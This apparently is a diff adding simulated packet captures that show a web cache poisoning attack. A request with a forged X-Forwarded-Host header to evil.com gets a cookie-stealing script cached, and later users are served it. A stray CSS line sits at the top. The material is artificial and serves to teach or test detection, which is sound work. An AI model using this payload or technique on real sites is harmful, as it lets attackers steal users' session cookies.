+.header { background: #333; color: #fff; padding: 20px; } .content { margin: 20px; }
+
+=== Packet Capture #45 - 2024-01-15 15:02:18 ===
+Source: 203.0.113.50:54011 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+X-Forwarded-Host: evil.com
+User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)
+Accept: application/json
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: MISS
+Date: Mon, 15 Jan 2024 15:02:18 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #46 - 2024-01-15 15:02:55 ===
+Source: 192.168.1.134:58012 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: application/json
+Cookie: session_id=yza234bcd567
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 15:02:55 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #47 - 2024-01-15 15:03:32 ===
+Source: 192.168.1.135:59123 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)
+Accept: application/json
+Cookie: session_id=efg890hij123
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: HIT
+Date: Mon, 15 Jan 2024 15:03:32 GMT
+Content-Length: 198
+
+{"user_id":"guest","username":"anonymous","email":"","profile_url":"https://evil.com/profiles/anonymous","status":"active","message":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>"}
+
+=== Packet Capture #48 - 2024-01-15 15:32:19 ===
+Source: 192.168.1.136:60234 -> Dest: 10.0.0.5:80
+GET /api/user/profile HTTP/1.1
+Host: webapp.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64)
+Accept: application/json
+Cookie: session_id=klm456nop789
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=1800
+Vary: Accept
+X-Cache: MISS
+Date: Mon, 15 Jan 2024 15:32:19 GMT
+Content-Length: 159
+
+{"user_id":"11223","username":"charlie_brown","email":"charlie@example.com","profile_url":"https://webapp.example.com/profiles/charlie_brown","status":"active"}
